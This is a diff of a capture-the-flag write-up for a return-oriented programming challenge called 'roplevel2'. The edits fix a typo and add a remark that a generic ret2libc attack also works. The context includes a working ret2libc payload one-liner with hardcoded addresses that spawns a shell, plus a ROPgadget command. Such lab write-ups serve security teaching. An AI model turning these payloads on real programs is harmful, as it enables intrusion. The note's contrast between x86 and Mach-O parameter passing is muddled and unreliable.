@@ -85,7 +85,7 @@ Find gadgets to return to a System Function
 
 ### Answer:
 
-USing pure ret2libc:
+Using pure ret2libc:
 
 ```
 (python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2
@@ -105,7 +105,7 @@ Using `ROPGadget --binary ./roplevel2` (`0x080492c2 : sub al, 0x24 ; ret`):
 
 ### Notes:
 
-Based on the design of this challenge, the gadget function is not suitable to solve the puzzle as x86 stores parameters to functions on the stack while Mach-O stores parameters to functions in lower registers. I have since edited the challenge to allow it to be exploitable on a Linux OS via the gadget function or finding gadgets within the binary itself as well :).
+Based on the design of this challenge, the gadget function is not suitable to solve the puzzle as x86 stores parameters to functions on the stack while Mach-O stores parameters to functions in lower registers. I have since edited the challenge to allow it to be exploitable on a Linux OS via the gadget function or finding gadgets within the binary itself as well :). Due to the nature of this exploit, you can even just use a generic ret2libc attack.
 
 ### References:
 
